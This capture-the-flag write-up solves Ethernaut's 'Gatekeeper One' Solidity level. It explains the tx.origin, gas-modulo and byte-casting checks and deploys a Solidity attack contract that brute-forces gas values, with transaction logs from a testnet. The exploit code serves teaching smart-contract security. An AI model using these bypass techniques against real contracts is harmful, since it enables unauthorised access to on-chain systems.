# 13 - Gatekeeper One

## Challenge

Make it past the gatekeeper and register as an entrant to pass this level.

Things that might help:

- Remember what you've learned from the Telephone and Token levels.
- You can learn more about the special function `gasleft()`, in Solidity's documentation (see [here](https://docs.soliditylang.org/en/v0.8.3/units-and-global-variables.html) and [here](https://docs.soliditylang.org/en/v0.8.3/control-structures.html#external-function-calls)).

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

## Summary

`gateOne()` has exactly the same vulnerability as `Telephone` level - as long as we send transaction via deployed contract, `msg.sender` will be different from `tx.origin`.

For `gateThree()`, we need to pass 3 conditions:

- Part 3: `uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)`. Remember `tx.origin` is our wallet address, in my case `0x0b26C24d538e3dfF58F7c733535e65a6674FB3aB`. `uint` casting will retain lower bytes, so `uint16(uint160(tx.origin)` gives `B3 aB`. This means last 4 bytes of `_gateKey` must be `00 00 B3 aB`.
- Part 1: `uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))`. This is the same as above.
- Part 2: `uint32(uint64(_gateKey)) != uint64(_gateKey)`. This means first 4 bytes of `_gateKey` must not be `00 00 00 00`.

We can set any value for `_gateKey` as long as it satisfies above conditions. e.g. `0x000000010000B3aB`.

For `gateTwo()`, we need `gasleft() % 8191` to be 0. Checking documentation, we see that in the transaction we can specify gas value by `.call{gas: i}`. We can try different values for `i` until we find one that satisfies the condition. e.g. a for loop that loops through ~8000 values will surely work.

## Walkthrough

```py
>>> from cheb3 import Connection
>>> from cheb3.utils import compile_sol
>>> conn = Connection("https://goerli.infura.io/v3/<key>")
>>> account = conn.account("<priv_key>")
>>> contract_addr = '"0xdd29E5ab49F28F82744F963514a2d08AC2037462"'
```

Deploy contract that will call `enter` with gas value and enumerate possible keys:

```py
>>> abi, bytecode = compile_sol('''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOneHack {
    function enterGate(address _gateAddr, uint256 _gas) public returns (bool) {
        bytes8 key = 0x000000010000B3aB;

        for (uint i = _gas - 4000; i < _gas + 4000; i++) {
            (bool success, ) = address(_gateAddr).call{gas: i}(abi.encodeWithSignature("enter(bytes8)", key));
            if (success) {
                return true;
            }
        }
        return false;
    }
}
''',
solc_version="0.8.17",
base_path="Ethernaut/node_modules/"
)['GatekeeperOneHack']
>>>
>>> attackContract = conn.contract(account, abi=abi, bytecode=bytecode)
>>> attackContract.deploy(contract_addr)
2023-06-19 23:28:30.126 | DEBUG    | cheb3.contract:deploy:94 - Deploying contract ...
2023-06-19 23:28:54.169 | INFO     | cheb3.contract:deploy:99 - The contract is deployed at 0xE02b53460563f91B84C2377c99521ac94946394c
```

Here we made a for-loop `for (uint i = _gas - 4000; i < _gas + 4000; i++)` to iterate all potential gas values.

```py
>>> attackContract.functions.enterGate(contract_addr, 8000).send_transaction()
```

Calling this, `await contract.entrant()` still shows zero address. Probably the gas is too small, or we are kinda unlucky. Trying it again with 38000 (a random value) works:

```py
>>> attackContract.functions.enterGate(contract_addr, 38000).send_transaction()
2023-06-19 23:31:43.459 | INFO     | cheb3.contract:send_transaction:236 - (0xE02b53460563f91B84C2377c99521ac94946394c).enterGate transaction hash: 0x9446e373410fe7a4e7732b51092370e9e3c8caffc1c4ff906799d9266bfdcb51
AttributeDict({'blockHash': HexBytes('0xf89bcf5c804df9dc6d2ffa60da040a1c31f9210a4e1ef7fd534917b2164516db'), 'blockNumber': 9208737, 'contractAddress': None, 'cumulativeGasUsed': 17510155, 'effectiveGasPrice': 1685, 'from': '0x0b26C24d538e3dfF58F7c733535e65a6674FB3aB', 'gasUsed': 12502817, 'logs': [], 'logsBloom': HexBytes('0x00..00'), 'status': 1, 'to': '0xE02b53460563f91B84C2377c99521ac94946394c', 'transactionHash': HexBytes('0x9446e373410fe7a4e7732b51092370e9e3c8caffc1c4ff906799d9266bfdcb51'), 'transactionIndex': 33, 'type': 0})
```

Now `await contract.entrant()` shows my own wallet address. Finally, submit the instance to pass the level.